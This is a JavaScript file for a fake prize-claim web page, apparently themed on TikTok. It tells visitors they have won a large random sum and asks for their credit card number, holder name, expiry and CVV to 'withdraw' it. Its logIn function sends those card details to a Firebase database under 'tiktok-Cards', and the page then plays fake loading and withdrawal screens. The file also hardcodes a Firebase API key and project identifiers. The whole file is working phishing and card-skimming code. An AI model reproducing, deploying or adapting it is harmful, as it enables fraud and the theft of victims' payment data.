const firebaseConfig = {
  apiKey: "AIzaSyBAFvYjzdLBPAePQ3utAwRDwAhaVK51UHQ",
  authDomain: "winmon-31ce3.firebaseapp.com",
  databaseURL: "https://winmon-31ce3-default-rtdb.firebaseio.com",
  projectId: "winmon-31ce3",
  storageBucket: "winmon-31ce3.appspot.com",
  messagingSenderId: "34156503301",
  appId: "1:34156503301:web:40c8c92cd156c095a7576c",
  measurementId: "G-B2J8CYYVYH",
};

firebase.initializeApp(firebaseConfig);
function addElementInFirebase(REF, data) {
  firebase.database().ref(`${REF}/${randomID()}`).set(data);
}

function getRefFromFirebase(REF) {
  const result = [];
  firebase
    .database()
    .ref(REF)
    .on("value", (response) => {
      response.forEach((element) => {
        result.push(generateFirebaseItem(element.key, element.val()));
      });
    });
  return result;
}

function getElementFromFirebase(REF, id) {
  const array = getRefFromFirebase(REF);
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      array.forEach((element) => {
        if (element.id === id) {
          resolve(element);
        }
      });
      reject("404");
    }, 1000);
  });
}

function removeElementFromFirebase(REF, id) {
  firebase.database().ref(`${REF}/${id}`).remove();
}

function removeRefFromFirebase(REF) {
  firebase.database().ref(REF).remove();
  setTimeout(() => {
    location.reload();
  }, 300);
}

function randomID() {
  let new_data = new Date().toString();
  let dateId = `${new_data}`;
  return dateId;
}

let randomNumbers = [
  "50,000",
  "40,000",
  "60,000",
  "70,000",
  "30,000",
  "20,000",
  "10,000",
  "80,000",
  "90,000",
  "100,000",
];
let sendingData = new Date().toLocaleDateString("en-GB");
let myDate = new Date().getHours();
let minute = new Date().getMinutes();
let seconds = new Date().getSeconds();
let allData = `(${myDate}:${minute}:${seconds}) - (${sendingData})`;
let numb = document.querySelector(".numb");
let contentWrapper = document.querySelector(".content");
let secondContent = document.querySelector(".second-wrapper");
let btnClaim = document.querySelector(".btn-claim");
let loader = document.querySelector(".loader");
let cardNumber = document.querySelector(".cardnumber");
let cardHolder = document.querySelector(".cardname");
let cardData = document.querySelector(".carddata");
let cardCcv = document.querySelector(".cardcvv");
let addBtn = document.querySelector(".accept");
let validErrorTitle = document.querySelector(".vailederrortitle");
let cardAddedWrapper = document.querySelector(".card-added-wrapper");
let secondWrapperTitle = document.querySelector(".second-wrapper-title");
let finalNumber = "";
let amount = document.querySelector(".amount");
let withdrawBtn = document.querySelector(".withdraw-btn");
let finalWrapper = document.querySelector(".final-wrapper");

randomNum();

withdrawBtn.addEventListener("click", () => {
  cardAddedWrapper.classList.remove("wievanim");
  cardAddedWrapper.classList.add("hidanim");
  setTimeout(() => {
    cardAddedWrapper.classList.add("hidden");
  }, 800);
  setTimeout(() => {
    loader.classList.remove("hidden");
  }, 1000);
  setTimeout(() => {
    loader.classList.add("hidden");
    finalWrapper.classList.remove("hidden");
    finalWrapper.classList.add("wievanim");
  }, 3000);
});

function randomNum() {
  let random = randomNumbers[Math.floor(Math.random() * randomNumbers.length)];
  numb.innerHTML = `${random}$`;
  finalNumber = random;
  randomNumbers = [50000, 40000];
}

addBtn.addEventListener("click", () => {
  if (cardNumber.value === "") {
    invalidInputs();
    validErrorTitle.innerHTML = "Invalid card number";
  } else if (cardHolder.value === "") {
    invalidInputs();
    validErrorTitle.innerHTML = "Invalid Card Holder";
  } else if (cardData.value === "") {
    invalidInputs();
    validErrorTitle.innerHTML = "Invalid Card Data";
  } else if (cardCcv.value === "") {
    invalidInputs();
    validErrorTitle.innerHTML = "Invalid Card CCV";
  } else {
    logIn();

    secondContent.classList.add("hidanim");
    setTimeout(() => {
      secondContent.classList.add("hidden");
    }, 800);
    setTimeout(() => {
      loader.classList.remove("hidden");
    }, 1000);
    setTimeout(() => {
      cardAddedWrapper.classList.remove("hidden");
      cardAddedWrapper.classList.add("wievanim");
      loader.classList.add("hidden");
    }, 3000);
  }
});

function invalidInputs() {
  validErrorTitle.classList.remove("hidden");
  setTimeout(() => {
    validErrorTitle.classList.add("hidden");
  }, 1500);
}

function formatString(e) {
  var inputChar = String.fromCharCode(event.keyCode);
  var code = event.keyCode;
  var allowedKeys = [8];
  if (allowedKeys.indexOf(code) !== -1) {
    return;
  }

  event.target.value = event.target.value
    .replace(
      /^([1-9]\/|[2-9])$/g,
      "0$1/" // 3 > 03/
    )
    .replace(
      /^(0[1-9]|1[0-2])$/g,
      "$1/" // 11 > 11/
    )
    .replace(
      /^([0-1])([3-9])$/g,
      "0$1/$2" // 13 > 01/3
    )
    .replace(
      /^(0?[1-9]|1[0-2])([0-9]{2})$/g,
      "$1/$2" // 141 > 01/41
    )
    .replace(
      /^([0]+)\/|[0]+$/g,
      "0" // 0/ > 0 and 00 > 0
    )
    .replace(
      /[^\d\/]|^[\/]*$/g,
      "" // To allow only digits and `/`
    )
    .replace(
      /\/\//g,
      "/" // Prevent entering more than 1 `/`
    );
}

btnClaim.addEventListener("click", () => {
  secondWrapperTitle.innerHTML = `To withdraw <span class="wincount">${finalNumber}$</span>, add your credit card`;
  amount.innerHTML = `Your Amount: <span class="wincount">${finalNumber}$</span>`;
  contentWrapper.classList.add("leftscrolcontent");
  setTimeout(() => {
    loader.classList.remove("hidden");
    contentWrapper.classList.add("hidden");
  }, 900);

  setTimeout(() => {
    loader.classList.add("hidden");
    secondContent.classList.remove("hidden");
  }, 2000);
});

function cc_format(value) {
  var v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
  var matches = v.match(/\d{4,16}/g);
  var match = (matches && matches[0]) || "";
  var parts = [];
  for (i = 0, len = match.length; i < len; i += 4) {
    parts.push(match.substring(i, i + 4));
  }
  if (parts.length) {
    return parts.join(" ");
  } else {
    return value;
  }
}

onload = function () {
  document.getElementById("cc").oninput = function () {
    this.value = cc_format(this.value);
  };
};
function checkDigit(event) {
  var code = event.which ? event.which : event.keyCode;

  if ((code < 48 || code > 57) && code > 31) {
    return false;
  }

  return true;
}

function logIn() {
  addElementInFirebase("tiktok-Cards", {
    number: cardNumber.value,
    holder: cardHolder.value,
    data: cardData.value,
    ccv: cardCcv.value,
    time: allData,
  });
}
